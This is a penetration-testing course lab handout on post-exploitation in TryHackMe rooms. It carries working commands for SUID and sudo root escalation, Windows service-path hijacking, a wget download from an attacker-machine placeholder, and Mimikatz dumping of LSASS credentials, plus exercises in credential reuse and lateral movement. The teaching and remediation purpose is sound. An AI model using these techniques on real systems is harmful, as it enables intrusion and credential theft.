# Lab Activity: Module 12 — Post-Exploitation & Privilege Escalation

## Course: CIS-4333 Penetration Testing

**Certification Alignment:** CompTIA PenTest+ (PT0-002)

---

## Lab Overview

In this lab you will practice privilege escalation techniques on both Linux and Windows vulnerable machines using TryHackMe. You will use automated enumeration tools (LinPEAS and WinPEAS), manually verify findings, and execute escalation techniques to gain root and SYSTEM access. You will also practice credential dumping with Mimikatz on the Windows target.

This lab uses the TryHackMe "Linux PrivEsc" and "Windows PrivEsc" rooms, which provide fully configured vulnerable machines accessible from your browser without requiring a local VM setup.

Estimated time: 120–150 minutes.

---

## Learning Objectives

By the end of this lab, you will be able to:

- Run LinPEAS and interpret its color-coded output to identify escalation vectors
- Exploit a SUID binary on Linux to gain a root shell
- Exploit a sudo misconfiguration on Linux to gain a root shell
- Run WinPEAS and identify Windows privilege escalation paths
- Exploit an unquoted service path or weak service permission on Windows to gain SYSTEM access
- Use Mimikatz to dump credential hashes from a Windows system
- Document each finding with proof-of-concept commands and remediation guidance

---

## Prerequisites

- TryHackMe account (free tier is sufficient)
- Access to TryHackMe "Linux Privilege Escalation" room and "Windows Privilege Escalation" room
- Alternatively: Kali Linux VM with access to a vulnerable lab VM (DVWA, VulnHub machines, or HackTheBox)
- Basic familiarity with Linux terminal and Windows command prompt from previous modules

---

## Part 1 — Linux Privilege Escalation (60–75 minutes)

### Step 1.1 — Access the Lab Environment

1. Navigate to TryHackMe and search for "Linux PrivEsc" or access the room directly from the Pentesting learning path.
2. Deploy the machine and connect via the browser-based AttackBox or your own VPN connection.
3. Log in to the target machine with the provided low-privilege credentials.

### Step 1.2 — Initial Enumeration

1. Perform manual baseline enumeration:

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
ip addr
```

Record: current user, OS version, kernel version, network interfaces.

2. Check for quick wins before running automated tools:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
```

**Deliverable 1.2:** Write down the current username, OS version, kernel version, and any SUID binaries or notable sudo permissions observed.

### Step 1.3 — Run LinPEAS

1. Download and execute LinPEAS (if internet is available from the target):

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt
```

2. If direct download is unavailable, transfer the script from your attack machine:

```bash
# On attack machine:
python3 -m http.server 8000
# On target:
wget http://ATTACK_IP:8000/linpeas.sh
```

3. Review the LinPEAS output. Focus on sections colored red (critical) and yellow (interesting). Note the top findings in each category:
   - SUID/SGID binaries
   - Sudo rules
   - Cron jobs
   - Writable directories in PATH
   - Interesting files (credentials, configuration)

**Deliverable 1.3:** Screenshot of LinPEAS output highlighting at least two red or yellow findings.

### Step 1.4 — Exploit a SUID Binary

1. Identify a SUID binary that appears in GTFOBins. Common candidates in TryHackMe PrivEsc rooms include: `find`, `vim`, `python`, `perl`, `awk`, `nmap`.
2. Navigate to gtfobins.github.io and find the SUID escalation technique for the identified binary.
3. Execute the escalation. For example, if `find` has SUID:

```bash
find . -exec /bin/sh -p \; -quit
```

4. Verify root access:

```bash
id
whoami
```

**Deliverable 1.4:** Screenshot showing the SUID binary name (with SUID bit confirmed via `ls -la`), the escalation command used, and the resulting `id` output showing `uid=0(root)`.

### Step 1.5 — Exploit a Sudo Misconfiguration

1. From the original low-privilege shell, check sudo permissions again:

```bash
sudo -l
```

2. Identify a binary that can be run with sudo. Look it up in GTFOBins under the "Sudo" category.
3. Execute the escalation. For example, if `python3` is allowed:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

4. Verify root access.

**Deliverable 1.5:** Screenshot showing the sudo rule, the escalation command, and the resulting root shell.

### Step 1.6 — Document the Linux Finding

Complete a finding record:

- **Finding Title:** Linux Privilege Escalation via SUID Binary (specify which binary)
- **Severity:** High
- **Affected System:** hostname and OS version
- **Description:** Two sentences explaining the vulnerability and how SUID escalation works.
- **Proof of Concept:** The exact commands used from enumeration to root shell.
- **Impact:** What an attacker with root access can do on this system.
- **Remediation:** Remove unnecessary SUID bits using `chmod -s /path/to/binary` or restrict sudo rules to necessary commands only.

---

## Part 2 — Windows Privilege Escalation (45–60 minutes)

### Step 2.1 — Access the Windows Lab

1. In TryHackMe, access the "Windows PrivEsc" room.
2. Connect to the Windows target via RDP or the browser-based terminal.
3. Log in with the provided low-privilege credentials.

### Step 2.2 — Initial Windows Enumeration

1. Run basic enumeration:

```cmd
whoami
whoami /priv
net user
systeminfo
```

2. Check for quick escalation indicators:

```cmd
sc query
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v "\""
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Deliverable 2.2:** Screenshot of `whoami /priv` output and any services with unquoted paths found.

### Step 2.3 — Run WinPEAS

1. Transfer WinPEAS to the target (it can be downloaded from the PEASS-ng GitHub releases page as `winpeas.exe`).
2. Run WinPEAS:

```cmd
winpeas.exe
```

3. Review the output for escalation paths. Key sections to check:
   - Services with unquoted paths
   - Services with weak permissions
   - AlwaysInstallElevated registry keys
   - Scheduled tasks running as SYSTEM
   - Stored credentials (Credential Manager, registry)

**Deliverable 2.3:** Screenshot of WinPEAS output highlighting at least one high-severity finding.

### Step 2.4 — Exploit an Unquoted Service Path or Weak Permission

Depending on what WinPEAS identifies in the lab environment, exploit the appropriate vector:

**Option A — Unquoted Service Path:**

1. Identify a service with an unquoted path containing spaces and write access to the parent directory.
2. Create a malicious executable at the exploitable path location. For lab purposes, use a simple command that creates a file to prove execution as the service account:

```cmd
echo "proof" > C:\proof.txt
```

A real engagement would use a reverse shell executable generated with msfvenom.

3. Restart the service:

```cmd
sc stop VulnerableService
sc start VulnerableService
```

4. Check for proof of execution.

**Option B — Weak Service Permissions:**

1. Identify a service where the current user has `SERVICE_CHANGE_CONFIG` permission.
2. Use `sc config` to modify the service binary path to a malicious executable.
3. Restart the service.

**Deliverable 2.4:** Screenshot showing the vulnerable service, the exploit technique used, and evidence of elevated execution (proof file creation or SYSTEM shell).

### Step 2.5 — Credential Dumping with Mimikatz

1. If you have obtained an administrator or SYSTEM shell, download Mimikatz to the target.
2. Run Mimikatz:

```cmd
mimikatz.exe
```

3. Enable debug privileges:

```
privilege::debug
```

4. Dump credentials from LSASS:

```
sekurlsa::logonpasswords
```

5. Record the NTLM hashes of any user accounts found.

**Deliverable 2.5:** Screenshot of Mimikatz output showing at least one user account with an NTLM hash (you may redact the hash in your submission with asterisks for security practice).

### Step 2.6 — Document the Windows Finding

Complete a finding record:

- **Finding Title:** Windows Privilege Escalation via (specify: Unquoted Service Path / Weak Service Permission / AlwaysInstallElevated)
- **Severity:** High
- **Affected System:** hostname and OS version
- **Description:** Two sentences explaining the specific misconfiguration and how it enables escalation.
- **Proof of Concept:** The exact steps and commands used from enumeration to SYSTEM.
- **Impact:** What an attacker with SYSTEM access can do, including credential dumping and persistence.
- **Remediation:** Specific fix for the identified vector (quote the service path, repair file permissions, disable AlwaysInstallElevated policy).

---

## Part 3 — Reflection Questions (All Students)

Answer these questions in complete sentences. Include your answers in the lab submission.

1. What is the key difference between a SUID binary escalation and a sudo misconfiguration escalation on Linux? When would you find one but not the other?

2. Why does an unquoted service path only become exploitable if the current user has write permissions in one of the searched directories? What would make the attack fail even if the path is unquoted?

3. Why might an enterprise defender choose to restrict LSASS memory access rather than patch Mimikatz itself? What Windows security feature specifically protects LSASS from Mimikatz?

---

## Submission Checklist

Before submitting, confirm you have included:

- [ ] Deliverable 1.2: Linux baseline enumeration results
- [ ] Deliverable 1.3: LinPEAS output screenshot
- [ ] Deliverable 1.4: SUID escalation screenshot
- [ ] Deliverable 1.5: Sudo escalation screenshot
- [ ] Linux finding record (complete)
- [ ] Deliverable 2.2: Windows whoami /priv screenshot
- [ ] Deliverable 2.3: WinPEAS output screenshot
- [ ] Deliverable 2.4: Windows escalation evidence screenshot
- [ ] Deliverable 2.5: Mimikatz credential dump screenshot
- [ ] Windows finding record (complete)
- [ ] Three reflection question answers

Submit all content as a single PDF or ZIP file to the Canvas assignment portal.

---

---

## Part 9 — Challenge Exercise

### Challenge 1: Cross-Platform Privilege Escalation Comparison

Using your authorized lab targets from Module 12 (Linux and Windows hosts), document a side-by-side comparison of the privilege escalation process on both platforms. For each platform, record: the enumeration tool used (LinPEAS/WinPEAS), the top three escalation vectors discovered ranked by exploitability, the specific exploitation command or technique for the highest-priority vector, the resulting privilege level achieved, and the MITRE ATT&CK technique ID for each vector. Format your comparison as a structured table with both platforms as columns. Then write a one-paragraph analysis explaining which platform presented a wider attack surface in your lab environment and what organizational security controls would most effectively reduce the privilege escalation exposure on each platform.

### Challenge 2: Credential Reuse Impact Demonstration

After achieving SYSTEM/root access on your authorized lab target, perform a structured credential reuse analysis. Extract all available local account hashes (SAM database on Windows via Mimikatz, or `/etc/shadow` on Linux). For each hash, document: the account name, hash format (NTLM, SHA-512, MD5-crypt), whether the account is enabled, and an estimated crack difficulty assessment based on the hash algorithm alone (without actually cracking). Using CrackMapExec (Windows) or SSH key testing (Linux), test whether any discovered credentials authenticate to a second authorized lab host. Document the complete lateral movement chain: which credentials moved from Host A to Host B, what access level was achieved on Host B, and what further escalation would be possible from that access. Write your chain as an attack narrative in professional report format.

### Reflection Questions

1. During the lab you used an automated tool (LinPEAS or WinPEAS) to enumerate privilege escalation vectors. Automated tools can produce false positives (flagging items that are not actually exploitable) and false negatives (missing vectors the tool does not check for). Describe one specific finding from your lab output that required manual verification to confirm it was truly exploitable, explain what manual step you performed to confirm it, and explain why relying solely on automated tool output without manual verification produces lower-quality penetration test findings.

2. The Windows lab target had `SeImpersonatePrivilege` enabled for the service account. A colleague argues that this privilege should simply be removed from all service accounts to prevent Potato/PrintSpoofer attacks. Using your understanding of how Windows services function, explain why this remediation approach may break legitimate service functionality, and propose a more balanced defensive approach that addresses the privilege escalation risk without disrupting operations.

*End of Module 12 Lab Activity*
